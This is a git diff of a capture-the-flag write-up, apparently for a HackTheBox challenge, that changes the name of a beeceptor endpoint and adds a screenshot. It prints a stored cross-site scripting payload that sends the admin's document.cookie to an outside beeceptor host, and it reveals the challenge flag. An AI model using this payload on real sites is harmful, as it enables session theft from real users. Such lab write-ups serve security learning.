@@ -26,13 +26,16 @@ Navigating back to *routes.js* to see the GET request for */queries*, I see that
 
 In order to obtain the cookie, we need to perform the following:
 * Set up a publicly accessible website 
-  * I created an endpoint called **mine562** on **beeceptor**
+  * I created an endpoint called **test234** on **beeceptor**
 * Craft a script to send the cookie to my endpoint
  ```html
-<script> document.write('<img src="https://mine562.free.beeceptor.com/collect.gif?cookie=' + document.cookie + '" />') </script>
+<script> document.write('<img src="https://test234.free.beeceptor.com/collect.gif?cookie=' + document.cookie + '" />') </script>
 ```
 * Paste the script in the text box and submit it
 
-After performing the steps above, I waited around a minute for the admin to view the queries. Voila! The cookie was sent to my endpoint and I obtained the flag
+After performing the steps above, I waited around a minute for the admin to view the queries. Voila! The cookie was sent to my endpoint and I obtained the flag:
+
+![beeceptor](https://user-images.githubusercontent.com/71312079/151480111-781487a7-df2f-4796-b9b9-9acf398710c4.png)
+
 
 Flag: `HTB{3v1l_3lv3s_4r3_r1s1ng_up!}`
